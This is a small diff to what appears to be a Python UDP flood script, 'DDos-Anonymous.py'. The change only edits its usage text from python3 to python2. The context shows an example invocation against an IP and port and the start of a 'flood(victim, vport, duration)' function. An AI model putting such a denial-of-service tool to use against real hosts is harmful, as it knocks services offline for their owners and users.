@@ -12,9 +12,9 @@ def usage():
     print "		Code By Mohamed-HaCkeR"
     print '''
     use :
-        python3 DDos-Anonymous.py <ip> <port> <packet>
+        python2 DDos-Anonymous.py <ip> <port> <packet>
     ex  :
-        python3 DDos-Anonymous.py 172.0.0.1 80 3000 '''
+        python2 DDos-Anonymous.py 172.0.0.1 80 3000 '''
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
